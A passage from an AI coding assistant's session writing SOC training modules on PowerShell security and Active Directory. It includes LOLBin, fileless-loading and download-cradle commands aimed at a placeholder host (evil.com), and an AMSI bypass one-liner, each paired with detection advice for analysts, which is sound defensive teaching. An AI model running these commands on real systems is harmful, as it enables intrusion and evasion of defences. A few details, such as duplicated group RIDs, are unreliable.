/i:http://evil.com/payload.sct scrobj.dll\n\n# Rundll32\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/payload.sct\")\n\n# InstallUtil\nInstallUtil /logfile= /LogToConsole=false /U evil.dll\n\n# MSBuild\nmsbuild.exe evil.csproj\n```\n**Detection**: Process tree (4688/Sysmon) showing PowerShell → LOLBin, or LOLBin with network connections.\n\n### 5. Reflective Loading / Fileless Execution\n```powershell\n# Load .NET assembly from memory (bytes)\n$bytes = (iwr http://evil.com/payload.bin).Content\n[System.Reflection.Assembly]::Load($bytes)\n[Payload.Class]::Main()\n\n# Load unmanaged DLL (DLL injection)\n[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\"C:\\Windows\\System32\\amsi.dll\"))\n```\n**Detection**: AMSI (catches at load), 4104 (sees `[Assembly]::Load`), Sysmon EID 7 (Image Load), EID 8 (CreateRemoteThread)\n\n### 6. AMSI Bypass (Public Techniques — All Patched/Detected)\n```powershell\n# Memory patch (old)\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Reflection (detected)\n$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(100)\n# ... patch AmsiScanBuffer in memory\n```\n**Detection**: AMSI event logs, Defender alerts, 4104 (sees the bypass code), behavior (script runs after bypass attempt)\n\n---\n\n## 6.6 PowerShell Investigation Workflow for L1\n\n### Alert: \"Suspicious PowerShell - Encoded Command\"\n```\n1. GET COMMAND LINE (4688 / Sysmon EID 1)\n   → powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAA...\n\n2. DECODE (CyberChef, PowerShell, base64 -d)\n   → $client = New-Object Net.WebClient; $client.DownloadString('http://malicious.com/payload.ps1')\n\n3. CHECK 4104 (Script Block Logging)\n   → Event 4104 shows SAME deobfuscated code + ScriptBlockId\n\n4. CHECK NETWORK (Sysmon EID 3 / Proxy / Firewall)\n   → Process: powershell.exe → Destination: malicious.com:443 → TLS handshake → Data transfer\n\n5. CHECK FILE SYSTEM (Sysmon EID 11 / EDR)\n   → %TEMP%\\payload.ps1 created? Hash? VT?\n\n6. CHECK PROCESS TREE\n   → Parent: WINWORD.EXE (Phishing) / CMD.EXE / EXPLORER.EXE / SERVICES.EXE\n\n7. THREAT INTEL\n   → Domain: malicious.com (registered 2 days ago, Namecheap, bulletproof hosting)\n   → IP: 203.0.113.45 (VT: 15/92 Cobalt Strike C2)\n\n8. CLASSIFY\n   → TRUE POSITIVE: Phishing → Macro → Encoded PS → Download → C2\n   → MITRE: T1059.001, T1105, T1071.001, T1055\n   → ESCALATE P2\n```\n\n---\n\n## 6.7 PowerShell Profile & Persistence\n\n### Profiles (Auto-run on PS start)\n| Profile | Path | Scope |\n|---------|------|-------|\n| All Users, All Hosts | `$PSHOME\\Profile.ps1` | System-wide |\n| All Users, Current Host | `$PSHOME\\Microsoft.PowerShell_profile.ps1` | System-wide, host-specific |\n| Current User, All Hosts | `$HOME\\Documents\\PowerShell\\Profile.ps1` | User-wide |\n| Current User, Current Host | `$HOME\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1` | User, host-specific |\n\n**Attack**: Write malicious code to profile → executes every PS session.\n**Detection**: File create (Sysmon EID 11) on profile paths, 4104 on profile load.\n\n### Other Persistence\n- **WMI Event Subscription** (Sysmon EID 19/20/21) → `powershell -enc ...`\n- **Scheduled Task** (4698) → Action: `powershell.exe -file ...`\n- **Registry Run Keys** (Sysmon EID 13) → `powershell -windowstyle hidden ...`\n- **Services** (7045) → `powershell.exe -noprofile -command ...`\n- **Shortcut (.lnk) modification** → Target: `powershell ...`\n\n---\n\n## 6.8 PowerShell Remoting (WinRM) — Lateral Movement\n\n### Protocols\n- **WinRM (5985 HTTP, 5986 HTTPS)** — SOAP over HTTP\n- **SSH Remoting (PS 6+)** — SSH transport\n\n### Common Lateral Commands\n```powershell\n# Enter-PSSession (interactive)\nEnter-PSSession -ComputerName TARGET -Credential $cred\n\n# Invoke-Command (non-interactive, most common for lateral)\nInvoke-Command -ComputerName TARGET -ScriptBlock { whoami } -Credential $cred\n\n# New-PSSession (persistent)\n$s = New-PSSession -ComputerName TARGET\nInvoke-Command -Session $s -ScriptBlock { ... }\n\n# WinRM config (enable on target)\nEnable-PSRemoting -Force\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"*\" -Force\n```\n\n### Detection\n| Source | Indicator |\n|--------|-----------|\n| **4624** | Logon Type 3 (Network) from remote, Account: admin/user |\n| **4688 / Sysmon** | `wsmprovhost.exe` (WinRM host process) spawning children |\n| **NDR** | TCP 5985/5986 between workstations (not management server) |\n| **4104** | Script blocks with `Invoke-Command`, `Enter-PSSession`, `New-PSSession` |\n| **WinRM Logs** | `Microsoft-Windows-WinRM/Operational` — connection details |\n\n---\n\n## 6.9 Constrained Language Mode & JEA\n\n### Language Modes\n| Mode | Capabilities | Use Case |\n|------|--------------|----------|\n| **FullLanguage** | All .NET, COM, WMI, unrestricted | Admin, interactive |\n| **ConstrainedLanguage** | Limited .NET (allowlist), no `Add-Type`, `[Reflection]`, `Invoke-Expression` | **AppLocker, WDAC, JEA** |\n| **RestrictedLanguage** | Only basic commands, no scripts | Kiosk |\n| **NoLanguage** | No commands | Lockdown |\n\n**Constrained Language** blocks: `IEX`, `[Assembly]::Load`, `Add-Type`, `[Reflection]`, `Get-Process`, `Stop-Process`, COM, WMI (mostly).\n\n**JEA (Just Enough Administration)**: Constrained endpoints + role-based commands. Users connect to restricted endpoint, run only approved functions.\n\n---\n\n## 6.10 PowerShell 7+ (Core) Differences\n\n| Feature | Windows PS 5.1 | PowerShell 7+ |\n|---------|----------------|---------------|\n| **Runtime** | .NET Framework | .NET Core / .NET 6+ |\n| **Default Path** | `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` | `C:\\Program Files\\PowerShell\\7\\pwsh.exe` |\n| **Module Path** | `PSModulePath` (system) | `PSModulePath` (user + system) |\n| **Profile** | `$PROFILE` (Documents) | `$PROFILE` (Documents/PowerShell) |\n| **AMSI** | Full | Full (since 7.2) |\n| **Script Block Logging** | Yes | Yes |\n| **Transcription** | Yes | Yes |\n| **Remoting** | WinRM | WinRM + SSH |\n| **Cross-platform** | No | Yes (Linux, macOS) |\n\n**Detection**: `pwsh.exe` process name, different paths, SSH remoting (port 22).\n\n---\n\n## 6.11 Interview Questions for This Module\n\n1. **What are the three PowerShell logging sources and which defeats obfuscation?**\n   - Module Logging (4103), Script Block Logging (4104), Transcription. **4104 defeats obfuscation** — logs after parsing.\n\n2. **How does Base64 encoded command (`-enc`) work and how do you decode it?**\n   - UTF-16LE string → Base64. Decode: `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc))`.\n\n3. **What is a \"download cradle\" and give 3 examples.**\n   - One-liner to download and execute remote code. Examples: `IEX (iwr url)`, `(New-Object Net.WebClient).DownloadString(url)`, `irm url | iex`.\n\n4. **How does Script Block Logging (4104) defeat string concatenation obfuscation?**\n   - Parser resolves concatenation (`'Down'+'load'`) into single string *before* logging. 4104 shows `DownloadString`.\n\n5. **What is AMSI and what does it scan?**\n   - Antimalware Scan Interface. Scans in-memory content: scripts, .NET assemblies, COM objects, before execution.\n\n6. **What process indicates PowerShell Remoting / WinRM lateral movement?**\n   - `wsmprovhost.exe` (WinRM host process) on target machine, spawning child processes.\n\n7. **Name 5 PowerShell LOLBins and how they're abused.**\n   - Certutil (decode/download), Mshta (HTA execution), Regsvr32 (SCT), Rundll32 (JS/COM), InstallUtil/MSBuild (bypass AppLocker).\n\n8. **What is Constrained Language Mode and what does it block?**\n   - Restricted mode: blocks `IEX`, `Add-Type`, `[Reflection]`, `[Assembly]::Load`, COM, WMI, process manipulation.\n\n9. **How do you detect PowerShell profile persistence?**\n   - File create (Sysmon EID 11) on profile paths (`$PROFILE`, `$PSHOME\\Profile.ps1`), 4104 on PS startup showing profile content.\n\n10. **Difference between Windows PowerShell 5.1 and PowerShell 7+ for detection?**\n    - Different binary (`pwsh.exe`), path (`Program Files\\PowerShell\\7`), cross-platform, SSH remoting, .NET Core runtime.\n\n---\n\n## 6.12 Study Checklist for Module 6\n\n- [ ] Explain PowerShell execution flow (Parser → Compiler → Runtime + AMSI)\n- [ ] Configure and explain 3 logging sources (Module, Script Block, Transcription)\n- [ ] Decode Base64 encoded command (UTF-16LE)\n- [ ] Identify 5 download cradle variants\n- [ ] Explain how 4104 defeats: concatenation, variables, format operator, encoding, compression\n- [ ] List 8 LOLBins executed via PowerShell\n- [ ] Describe reflective loading / fileless execution detection (AMSI, 4104, Sysmon)\n- [ ] Investigate end-to-end: Encoded command alert → decode → 4104 → network → file → tree → TI → classify\n- [ ] Explain WinRM lateral movement detection (wsmprovhost, 4624 Type 3, 5985/5986)\n- [ ] Differentiate FullLanguage vs ConstrainedLanguage vs JEA\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 7 — Active Directory*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/06-powershell-security.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra Free · 43.8s)

_Thinking:_

Good, Module 6 is done. Now let me continue with Module 7 - Active Directory.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra Free · 188.1s)

_Thinking:_

Now let me create Module 7 - Active Directory.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 7: Active Directory\n\n**Priority: P0 — Identity is the new perimeter. AD compromise = domain compromise.**\n\n---\n\n## 7.1 Active Directory Fundamentals\n\n### What is Active Directory?\n**Directory service** for Windows domain networks. Stores objects (users, computers, groups, GPOs) in a hierarchical database. Provides authentication, authorization, and policy enforcement.\n\n### Core Concepts\n| Concept | Description |\n|---------|-------------|\n| **Forest** | Top-level container. One or more domains. Security boundary. |\n| **Domain** | Logical partition. Replication boundary. Contains objects. |\n| **Domain Controller (DC)** | Server running AD DS. Holds writable copy of domain partition. |\n| **Global Catalog (GC)** | Partial replica of all objects in forest. Universal group membership. Port 3268/3269. |\n| **FSMO Roles** | 5 single-master operations roles (Schema, Domain Naming, RID, PDC, Infrastructure). |\n| **Trust** | Authentication path between domains/forests (transitive, non-transitive, forest, external). |\n\n---\n\n## 7.2 AD Objects — What L1 Needs to Know\n\n### User Objects\n| Attribute | SOC Relevance |\n|-----------|---------------|\n| `sAMAccountName` | Pre-Win2k logon name (DOMAIN\\user) |\n| `userPrincipalName` (UPN) | Modern logon (user@domain.com) |\n| `objectSid` | Unique identifier (S-1-5-21-...-RID) |\n| `primaryGroupID` | Default group (usually 513 = Domain Users) |\n| `memberOf` | **Group memberships** (nested!) — privilege escalation path |\n| `userAccountControl` | Flags: ACCOUNTDISABLE (0x2), PASSWD_NOTREQD (0x20), DONT_EXPIRE_PASSWORD (0x10000), TRUSTED_FOR_DELEGATION (0x80000) |\n| `lastLogon` / `lastLogonTimestamp` | Last interactive logon (lastLogon not replicated!) |\n| `pwdLastSet` | Password last changed (0 = must change) |\n| `badPwdCount` / `badPasswordTime` | Failed logon tracking |\n| `servicePrincipalName` (SPN) | **Kerberoasting target** — service accounts |\n| `adminCount` | 1 = AdminSDHolder protected (Domain Admins, etc.) |\n| `msDS-KeyCredentialLink` | WHfB / Certificate auth |\n\n### Computer Objects\n| Attribute | SOC Relevance |\n|-----------|---------------|\n| `dNSHostName` | FQDN |\n| `operatingSystem` / `operatingSystemVersion` | Patch level, EOL detection |\n| `lastLogonTimestamp` | Stale computer cleanup |\n| `msDS-SupportedEncryptionTypes` | Kerberos encryption support (RC4 = weak) |\n| `userAccountControl` | TRUSTED_FOR_DELEGATION, TRUSTED_TO_AUTH_FOR_DELEGATION |\n\n### Group Objects\n| Type | Scope | Use |\n|------|-------|-----|\n| **Security Group** | Domain Local, Global, Universal | Permissions, rights |\n| **Distribution Group** | Email only | No security use |\n\n**Critical Built-in Groups**:\n| Group | SID Suffix | Privilege |\n|-------|------------|-----------|\n| Domain Admins | -512 | Full domain admin |\n| Enterprise Admins | -519 | Full forest admin |\n| Schema Admins | -518 | Schema modifications |\n| Administrators (Builtin) | -544 | Local admin on DCs |\n| Account Operators | -550 | User/group management |\n| Server Operators | -549 | Server management |\n| Print Operators | -550 | Printer management |\n| Backup Operators | -551 | Backup/restore (can read NTDS.dit!) |\n| Group Policy Creator Owners | -530 | Create GPOs |\n| **Protected Users** | -525 | **Restricted auth** (no NTLM, no RC4, no delegation) |\n\n---\n\n## 7.3 Organizational Units (OUs) & Group Policy\n\n### OU Structure (Typical)\n```\ndomain.com\n├── Domain Controllers (OU) → Default Domain Controllers Policy\n├── Servers (OU)\n│   ├── Tier 0 (PKI, PAM)\n│   ├── Tier 1 (Apps, DB)\n│   └── Tier 2 (File, Print)\n├── Workstations (OU)\n│   ├── Laptops\n│   ├── Desktops\n│   └── Kiosk\n├── Users (OU)\n│   ├── Admins\n│   ├── Service Accounts\n│   ├── Employees\n│   └── Contractors\n└── Groups (OU)\n    ├── Security\n    └── Distribution\n```\n\n### Group Policy Objects (GPOs)\n- **Linked to**: Site, Domain, OU (LSDOU order)\n- **Inheritance**: Child OUs inherit parent GPOs (Block Inheritance / Enforced)\n- **Security Filtering**: Apply to specific groups\n- **WMI Filtering**: Dynamic targeting\n\n**Critical GPOs for SOC**:\n| GPO | Purpose |\n|-----|---------|\n| Default Domain Policy | Password policy, account lockout, Kerberos |\n| Default Domain Controllers Policy | Audit policy, user rights, security options |\n| **Audit Policy GPO** | **Enable all Advanced Audit Policy subcategories** |\n| **AppLocker / WDAC GPO** | Application control |\n| **LAPS GPO** | Local admin password management |\n\n---\n\n## 7.4 Service Accounts — High-Value Targets\n\n| Type | Description | Risk |\n|------|-------------|------|\n| **Domain User as Service** | Regular user with SPN, password never expires | **Kerberoasting**, password spray |\n| **Group Managed Service Account (gMSA)** | Auto-rotated password, managed by DC | Low (no interactive logon) |\n| **Standalone Managed Service Account (sMSA)** | Single server, auto-rotated | Low |\n| **Virtual Account** | `NT SERVICE\\ServiceName` | Local only |\n| **SYSTEM / Network Service / Local Service** | Built-in | Local only |\n\n**Service Account Hygiene Checks**:\n- [ ] SPN set? (Kerberoasting target)\n- [ ] Password last set > 1 year?\n- [ ] Member of privileged groups?\n- [ ] `userAccountControl`: DONT_EXPIRE_PASSWORD (0x10000)?\n- [ ] `adminCount = 1` (AdminSDHolder)?\n- [ ] Delegation configured? (Unconstrained = high risk)\n\n---\n\n## 7.5 Privileged Accounts & Tier Model\n\n### Microsoft Tier Model (Security Best Practice)\n```\nTIER 0 — Identity Control Plane\n├── Domain Controllers\n├── AD FS / Azure AD Connect\n├── PKI (CA)\n├── PAM (Privileged Access Management)\n└── Domain/Enterprise/Schema Admins\n    → Dedicated Tier 0 admin accounts (no email, no web)\n    → Tier 0 PAW (Privileged Access Workstation)\n\nTIER 1 — Enterprise Applications\n├── SQL, Exchange, SharePoint\n├── Critical business apps\n├── Application admins\n    → Tier 1 admin accounts\n    → Tier 1 PAW\n\nTIER 2 — End-User Workloads\n├── Workstations, Laptops\n├── Helpdesk, standard users\n├── Standard user accounts\n    → Regular workstations\n\nTIER 3 — (Optional) DMZ / Cloud / Untrusted\n```\n\n**Golden Rules**:\n1. **Tier 0 admins NEVER log into Tier 1/2**\n2. **Tier 1 admins NEVER log into Tier 2**\n3. **Separate accounts per tier** (admin.t0, admin.t1, user.t2)\n4. **PAW required** for Tier 0/1 admin work\n\n### AdminSDHolder & SDProp\n- **AdminSDHolder** (CN=AdminSDHolder,CN=System,DC=domain) — template ACL for privileged groups\n- **SDProp** — runs every 60 min on PDC Emulator, reapplies AdminSDHolder ACL to all protected accounts (adminCount=1)\n- **Effect**: Manual ACL changes on Domain Admins etc. **reverted within 60 min**\n\n---\n\n## 7.6 AD Authentication vs Authorization\n\n| Concept | Description | AD Mechanism |\n|---------|-------------|--------------|\n| **Authentication** | *Who are you?* | Kerberos / NTLM → Ticket / Token |\n| **Authorization** | *What can you do?* | Access Token (SIDs + Privileges) + ACL on Object (DACL/SACL) |\n\n### Access Token (Created at Logon)\n```\nToken Contains:\n├── User SID\n├── Group SIDs (primary + all nested groups)\n├── Privileges (SeDebugPrivilege, SeBackupPrivilege, etc.)\n├── Integrity Level (System, High, Medium, Low)\n├── Logon Session ID (LUID)\n└── Claims (Dynamic Access Control)\n```\n\n**Authorization Check**:\n```\nRequestor Token → Object Security Descriptor (DACL)\n    │\n    ├── Owner SID → Owner ACEs\n    ├── Primary Group SID → Group ACEs\n    ├── Group SIDs (token) → Match ACEs (Allow/Deny)\n    └── Everyone / Authenticated Users → Match ACEs\n    │\n    ▼\nResult: Allow / Deny / Audit\n```\n\n---\n\n## 7.7 AD Reconnaissance — What Attackers Enumerate\n\n### BloodHound / SharpHound Data (What They Collect)\n| Collection Method | Data |\n|-------------------|------|\n| LDAP | Users, Groups, Computers, GPOs, OUs, Trusts, ACLs |\n| Remote Registry | Local admins (via `HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\NullSessionPipes`) |\n| WMI | Sessions, Logged-on users, Shares, Services |\n| DCOM | Session info |\n\n### Key Attack Paths (BloodHound Edge Types)\n| Edge | Meaning | Abuse |\n|------|---------|-------|\n| `MemberOf` | User/Computer in Group | Nested group privilege escalation |\n| `HasSession` | User logged on Computer | Credential theft (LSASS) |\n| `AdminTo` | User/Group has admin rights on Computer | Lateral movement |\n| `AllExtendedRights` | User/Group has extended rights on Object | Password reset, write SPN, DCSync |\n| `ForceChangePassword` | Can reset password | Takeover |\n| `AddMember` | Can add members to Group | Privilege escalation |\n| `GenericAll` / `GenericWrite` / `WriteDacl` / `WriteOwner` | Full/Write ACL control | Object takeover |\n| `DCSync` | Domain replication rights (DS-Replication-Get-Changes) | **Domain compromise** |\n| `AllowedToDelegate` / `TrustedToAuth` | Kerberos delegation | **Privilege escalation** |\n\n---\n\n## 7.8 AD Security Monitoring — Key Events\n\n### Critical Event IDs (From Module 4 + AD Specific)\n| Event ID | Channel | What |\n|----------|---------|------|\n| **4720** | Security | User Created |\n| **4722/4725** | Security | User Enabled/Disabled |\n| **4723/4724** | Security | Password Change/Reset |\n| **4728/4732/4756** | Security | User Added to Group (Global/Domain Local/Universal) |\n| **4729/4733/4757** | Security | User Removed from Group |\n| **4738** | Security | User Changed (attrs) |\n| **4740** | Security | User Locked Out |\n| **4741/4743** | Security | Computer Created/Changed |\n| **4768/4769/4770** | Security | Kerberos TGT/TGS (see Module 8) |\n| **4771** | Security | Kerberos Pre-Auth Failed |\n| **4776** | Security | NTLM Auth (on DC) |\n| **5136** | Directory Service | **LDAP Modify** (attribute changes) — **Critical for AD changes** |\n| **5137** | Directory Service | LDAP Create |\n| **5138** | Directory Service | LDAP Delete |\n| **5139** | Directory Service | LDAP Move |\n| **5141** | Directory Service | LDAP Undelete |\n\n### 5136 — The AD Change Detective\n```\nKey Fields:\n├── ObjectDN:           CN=AdminUser,OU=Admins,DC=domain,DC=com\n├── AttributeLDAPDisplayName:  memberOf / userAccountControl / unicodePwd / nTSecurityDescriptor\n├── AttributeSyntaxOID:  2.5.5.x (syntax type)\n├── AttributeValue:     New value (or <value not logged> for sensitive)\n├── OperationType:      Add / Delete / Replace\n├── SubjectUserName:    Who made change\n├── SubjectDomainName:\n└── CallerProcessName:  Process (ldap.exe, powershell.exe, mmc.exe)\n```\n\n**Monitor These Attribute Changes**:\n| Attribute | Why |\n|-----------|-----|\n| `memberOf` (Group changes) | Privilege escalation |\n| `userAccountControl` | Delegation, password not required, disabled |\n| `unicodePwd` / `ntPwdHistory` | Password changes (DCSync) |\n| `nTSecurityDescriptor` | ACL changes (persistence) |\n| `servicePrincipalName` | Kerberoasting setup |\n| `msDS-AllowedToActOnBehalfOfOtherIdentity` | **Resource-based Constrained Delegation (RBCD)** |\n| `userParameters` | Dial-in, callback (legacy) |\n\n---\n\n## 7.9 Azure AD / Entra ID — Cloud Identity\n\n### Key Differences from On-Prem AD\n| On-Prem AD | Entra ID |\n|------------|----------|\n| Kerberos / NTLM | OAuth 2.0 / OpenID Connect / SAML / WS-Fed |\n| Domain/Forest | Tenant (single flat namespace) |\n| OU/GPO | Administrative Units / Device Configuration Profiles |\n| Domain Controller | Managed by Microsoft (no DC access) |\n| Trust | B2B (Guest), B2C, Cross-tenant sync |\n| Password Hash Sync / PTA / Federation | Auth methods |\n\n### Entra ID Logs (Critical for L1 in Hybrid)\n| Log | What |\n|-----|------|\n| **Sign-in Logs** | Interactive, non-interactive, service principal, managed identity |\n| **Audit Logs** | Directory changes (user, group, app, role, policy) |\n| **Provisioning Logs** | SCIM/HR-driven provisioning |\n| **Risk Detections** | Risky sign-ins (impossible travel, anonymous IP, atypical, leaked creds) |\n\n### Hybrid Identity Attacks\n| Attack | Description |\n|--------|-------------|\n| **Password Hash Sync (PHS) Abuse** | Compromise on-prem → sync to cloud |\n| **Seamless SSO / PTA Abuse** | Compromise PTA agent → bypass MFA |\n| **AD Connect Sync Account** | `MSOL_...` / `AAD_...` account — high privilege |\n| **Cloud-only Admin** | Global Admin in Entra ID ≠ Domain Admin on-prem |\n| **Device Registration** | Join personal device → access corporate resources |\n| **App Registration / Service Principal** | Credentials (cert/secret) → app impersonation |\n\n---\n\n## 7.10 AD Hardening Basics (What L1 Should Recognize)\n\n| Control | Purpose |\n|---------|---------|\n| **Protected Users Group** | Blocks NTLM, RC4, delegation, caches |\n| **LAPS** | Unique local admin passwords per machine |\n| **Tiered Administration** | Separate accounts/PAWs per tier |\n| **PAW (Privileged Access Workstation)** | Hardened admin workstation |\n| **Time-based Access (PIM/PAM)** | Just-in-time privileged access |\n| **Authentication Silos** | Restrict authN policies per tier |\n| **DC Hardening** | No internet, no agents (or minimal), restricted RDP |\n| **Audit Policy** | Advanced Audit Policy (Module 4) |\n| **AdminSDHolder Review** | Verify ACL template |\n| **Delegation Review** | Unconstrained → Constrained / None |\n| **SPN Review** | Remove unused SPNs (Kerberoasting reduction) |\n| **KRBTGT Rotation** | Rotate twice (Golden Ticket mitigation) |\n| **DFL/FFL** | Domain/Forest Functional Level (2016+ for features) |\n\n---\n\n## 7.11 Interview Questions for This Module\n\n1. **What is the difference between a Domain, Forest, and OU?**\n   - Domain: Replication/auth boundary. Forest: Security boundary (multiple domains). OU: Administrative container for GPO linking/delegation.\n\n2. **What are the 5 FSMO roles and which is most critical for password changes?**\n   - Schema Master, Domain Naming Master, RID Master, PDC Emulator, Infrastructure Master. **PDC Emulator** — password changes, account lockouts, time sync, GPO default.\n\n3. **What is AdminSDHolder and SDProp?**\n   - AdminSDHolder: Template ACL for privileged accounts (adminCount=1). SDProp: Process on PDC that reapplies template every 60 min.\n\n4. **What is the Tier Model and why does it matter?**\n   - Tier 0 (Identity/DC), Tier 1 (Apps), Tier 2 (Workstations). Prevents 